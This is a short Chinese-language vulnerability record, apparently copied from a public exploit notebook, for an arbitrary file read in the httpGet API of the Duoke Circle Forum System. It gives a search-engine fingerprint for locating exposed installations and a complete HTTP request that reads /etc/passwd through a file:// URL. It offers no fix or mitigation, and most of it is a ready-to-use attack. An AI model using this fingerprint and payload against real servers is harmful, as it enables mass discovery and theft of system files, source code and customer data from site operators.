# 多客圈子论坛系统httpGet存在任意文件读取漏洞

# 一、漏洞简介
多客圈子论坛系统是一种在线社区平台，旨在为用户提供一个共享知识、经验和想法的空间。社交圈子论坛系统除了提供基本的社交功能外，还可以根据用户行为和兴趣为用户推荐相关内容。 多客圈子论坛系统 httpGet接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。 

# 二、影响版本
+ 多客圈子论坛系统

# 三、资产测绘
```plain
body="/static/index/js/jweixin-1.2.0.js"
```

![1718072652587-1ddcb3fb-c3f2-46eb-a86c-0cfe7e1e8eb5.png](./img/LMSv_axjAY4hGuYk/1718072652587-1ddcb3fb-c3f2-46eb-a86c-0cfe7e1e8eb5-274680.png)

# 四、漏洞复现
```http
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![1718072728134-f5bfd022-8381-475a-8997-199ef1af84da.png](./img/LMSv_axjAY4hGuYk/1718072728134-f5bfd022-8381-475a-8997-199ef1af84da-138441.png)



> 更新: 2024-06-17 09:34:03  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gv2apt8f7pypg1nt>